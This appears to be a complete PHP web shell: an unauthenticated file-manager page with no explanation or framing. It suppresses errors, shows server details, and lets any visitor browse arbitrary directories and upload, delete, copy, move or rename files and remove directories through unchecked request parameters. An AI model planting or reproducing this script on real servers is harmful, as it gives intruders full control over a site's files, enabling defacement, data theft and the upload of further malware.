<html><body>
<style type="text/css">
    body{
        background: #ffffff;
        color: #666666;
        font-family: Verdana;
        font-size: 11px;
    }
    a:link{
        color: #33CC99;
    }
    a:visited{
        color: #269771;
    }
    a:hover{
        text-decoration: none;
        Color: #3399FF;
    }
    table {
        font-size: 11px;
    }
</style>
<?php
error_reporting (0);
set_time_limit (0);

if (empty ($_GET ['dir'])){
    $dir = getcwd ();
} else {
    $dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);

echo "<i>Server: " . $_SERVER ['SERVER_NAME'] . "<br>";
echo "Current directory: " . getcwd () . "<br>";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'];
echo "<br>";
echo "<br>";
echo "<form action = '" . $current . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\n";
echo "Local file: <input type = 'file' name = 'upload_file'>";
echo "<input type = 'submit' value = 'Upload'>";
echo "</form><br>";

$mode = $_GET ['mode'];
switch ($mode) {
    case 'delete':
        $file = $_GET ['file'];
        if (unlink($file)) {
            echo $file . " deleted successfully.<p>";
        } else {
            echo "Unable to delete " . $file . ".<p>";
        }
        break;
    case 'copy':
        $src = $_GET ['src'];
        $dst = $_POST ['dst'];
        if (empty ($dst)) {
            echo "<form action = '" . $current . "&mode=copy&src=" . $src . "' method = 'POST'>\n";
            echo "Destination: <input name = 'dst'><br>\n";
            echo "<input type = 'submit' value = 'Copy'></form>\n";
        } else {
            if (copy($src, $dst)) {
                echo "File copied successfully.<p>\n";
            } else {
                echo "Unable to copy " . $src . ".<p>\n";
            }
        }
        break;
    case 'move':
        $src = $_GET ['src'];
        $dst = $_POST ['dst'];
        if (empty ($dst)) {
            echo "<form action = '" . $current . "&mode=move&src=" . $src . "' method = 'POST'>\n";
            echo "Destination: <input name = 'dst'><br>\n";
            echo "<input type = 'submit' value = 'Move'></form>\n";
        } else {
            if (rename($src, $dst)) {
                echo "File moved successfully.<p>\n";
            } else {
                echo "Unable to move " . $src . ".<p>\n";
            }
        }
        break;
    case 'rename':
        $old = $_GET ['old'];
        $new = $_POST ['new'];
        if (empty ($new)) {
            echo "<form action = '" . $current . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
            echo "New name: <input name = 'new'><br>\n";
            echo "<input type = 'submit' value = 'Rename'></form>\n";
        } else {
            if (rename($old, $new)) {
                echo "File/Directory renamed successfully.<p>\n";
            } else {
                echo "Unable to rename " . $old . ".<p>\n";
            }
        }
        break;

    case 'rmdir':
        $rm = $_GET ['rm'];
        if (rmdir($rm)) {
            echo "Directory removed successfully.<p>\n";
        } else {
            echo "Unable to remove " . $rm . ".<p>\n";
        }
        break;
    case 'upload':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        if (!empty ($file)) {
            if (move_uploaded_file($temp, $file)) {
                echo "File uploaded successfully.<p>\n";
                unlink($temp);
            } else {
                echo "Unable to upload " . $file . ".<p>\n";
            }
        }
        break;
}
clearstatcache ();
echo "<pre>\n\n</pre>";
echo "<table width = 100%>\n";
$files = scandir ($dir);
foreach ($files as $file){
    if (is_dir ($file)){
        $items = scandir ($file);
        $items_num = count ($items) - 2;
        echo "<tr><td><a href = ".$current . "/" . $file.">".$file."</a></td>";
        echo "<td>".$items_num." Items</td>";
        echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Remove directory</a></td>";
        echo "<td>-</td>";
        echo "<td>-</td>";
        echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Rename directory</a></td></tr>";
    }
}
foreach ($files as $file){
    if (is_file ($file)){
        $size = round (filesize ($file) / 1024, 2);
        echo "<tr><td>".$file."</td>";
        echo "<td>".$size." KB</td>";
        echo "<td><a href = ".$current . "&mode=delete&file=".$file.">Delete</a></td>";
        echo "<td><a href = ".$current . "&mode=copy&src=".$file.">Copy</a></td>";
        echo "<td><a href = ".$current . "&mode=move&src=".$file.">Move</a></td>";
        echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Remame</a></td></tr>";
    }
}
echo "</table><br>";
